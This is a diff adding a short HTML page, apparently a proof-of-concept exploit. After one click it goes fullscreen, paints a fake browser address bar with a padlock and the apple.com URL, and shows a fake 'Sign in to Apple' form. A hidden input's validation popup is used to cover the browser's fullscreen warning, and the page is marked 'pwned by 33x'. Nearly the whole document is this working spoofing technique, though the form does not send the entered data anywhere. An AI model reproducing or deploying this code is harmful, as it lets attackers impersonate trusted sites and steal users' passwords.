@@ -1,0 +1,17 @@
+<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Secure Login</title>
+<style>body{margin:0;font-family:-apple-system,system-ui,sans-serif}
+#bar{display:none;position:fixed;top:0;left:0;right:0;background:#dee1e6;padding:8px 10px;align-items:center;gap:8px;z-index:99999}#bar.on{display:flex}
+#omni{flex:1;background:#fff;border-radius:16px;padding:7px 14px;font-size:14px;color:#202124}
+#body{padding:80px 24px}.mark{color:#c00;font-weight:700;margin-top:12px}
+input{display:block;width:260px;margin:8px 0;padding:12px;border:1px solid #ccc;border-radius:8px}
+button{background:#0b62d6;color:#fff;border:0;border-radius:8px;padding:12px 22px;font-size:15px;font-weight:600}</style></head>
+<body>
+<div id="bar"><span>&#128274;</span><div id="omni">https://www.apple.com</div></div>
+<div id="body"><button onclick="go()">Enter secure login</button>
+<div id="fake" style="display:none"><h1>Sign in to Apple</h1><input placeholder="Apple ID"><input placeholder="Password" type="password"><div class="mark">pwned by 33x</div></div></div>
+<script>
+function go(){var el=document.documentElement;(el.requestFullscreen?el.requestFullscreen():Promise.reject()).then(function(){
+  document.getElementById('bar').className='on'; document.getElementById('fake').style.display='block';
+  try{var i=document.createElement('input');i.required=true;i.style.opacity=0;document.body.appendChild(i);i.setCustomValidity('.');i.reportValidity();}catch(e){} // cover the fullscreen toast
+}).catch(function(){});}
+</script></body></html>
